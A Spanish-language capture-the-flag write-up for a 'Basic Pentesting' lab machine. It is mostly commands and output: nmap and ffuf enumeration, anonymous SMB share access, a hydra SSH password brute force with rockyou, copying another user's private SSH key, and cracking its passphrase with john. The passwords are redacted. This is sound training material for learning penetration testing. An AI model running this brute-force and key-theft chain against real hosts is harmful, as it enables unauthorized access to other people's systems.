Basic Pentesting — Writeup
TL;DR
Se identificaron servicios HTTP, SSH y Samba. Se encontró un share anónimo con staff.txt que sugiere el usuario jan. Se obtuvo acceso SSH a jan por fuerza bruta (wordlist rockyou), desde jan se recuperó la clave privada de kay y se crackeó su passphrase con john, permitiendo acceso final como kay.

Enumeración (nmap)
Comando

nmap -sV --open $IP
Comentario: -sV detecta versiones de servicios.

Resultado

# Nmap 7.95 scan initiated Fri Sep 26 19:54:46 2025 as: /usr/lib/nmap/nmap --privileged -sV --open $IP
Nmap scan report for $IP
Host is up (0.35s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Sep 26 19:55:04 2025 -- 1 IP address (1 host up) scanned in 18.58 seconds
Resumen

22/tcp open ssh (OpenSSH 8.2p1)
80/tcp open http (Apache/2.4.41)
139/445/tcp open Samba (smbd)
Enumeración de directorios web (ffuf)
Comando

ffuf -u http://$IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -t 300 -s -c
Comentario: -t 300 define la cantidad de hilos; -s silencia headers extra; -c activa color en resultado.

Resultado

# Priority-ordered case-sensitive list, where entries were found
#
# Suite 300, San Francisco, California, 94105, USA.
# Copyright 2007 James Fisher
# or send a letter to Creative Commons, 171 Second Street,
# license, visit http://creativecommons.org/licenses/by-sa/3.0/
#

# directory-list-2.3-small.txt
#
# Attribution-Share Alike 3.0 License. To view a copy of this
#
# This work is licensed under the Creative Commons
# on at least 3 different hosts
development
Resultado relevante

/development
Smb — share anónimo
Enumeración

smbclient -L //$IP
Resultado

	Sharename       Type      Comment
	---------       ----      -------
	Anonymous       Disk      
	IPC$            IPC       IPC Service (Samba Server 4.15.13-Ubuntu)
Reconnecting with SMB1 for workgroup listing.
Protocol negotiation to server $IP (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
Resultado relevante

Share accesible: Anonymous (Disk)
Conexión y archivo

smbclient //$IP/Anonymous
smb: \> ls
smb: \> get staff.txt
staff.txt
Comentario: Indicio de usuario jan. Revisar si el share expone archivos sensibles o rutas del filesystem.

Fuerza bruta SSH (usuario: jan)
Comando

hydra -l jan -P /usr/share/wordlists/rockyou.txt -t 4 ssh://$IP
Comentario: -l especifica login; -P wordlist; -t 4 tareas paralelas. Usar siempre con autorización.

Resultado

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-27 15:49:48
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://$IP/
[STATUS] 46.00 tries/min, 46 tries in 00:01h, 14344353 to do in 5197:14h, 4 active
[STATUS] 52.33 tries/min, 157 tries in 00:03h, 14344242 to do in 4568:14h, 4 active
[STATUS] 52.29 tries/min, 366 tries in 00:07h, 14344033 to do in 4572:20h, 4 active
[22][ssh] host: $IP   login: jan   password: REDACTED
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-27 16:04:48
Acceso inicial y obtención de clave
Operaciones realizadas

ssh jan@$IP
# desde la sesión de jan:
scp jan@$IP:/home/kay/.ssh/id_rsa ./
Comentario: La clave privada id_rsa estaba accesible desde la cuenta jan.

Cracking de passphrase y acceso final
Conversión y cracking

ssh2john id_rsa > rsa_john.txt
john rsa_john.txt --wordlist=/usr/share/wordlists/rockyou.txt
Resultado

Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
PASSWORD_REDACTED          (id_rsa)     
1g 0:00:00:00 DONE (2025-09-27 15:42) 10.00g/s 827360p/s 827360c/s 827360C/s behlat..bball40
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
Uso

ssh -i id_rsa kay@$IP
# introducir passphrase para la clave
cat pass.bak
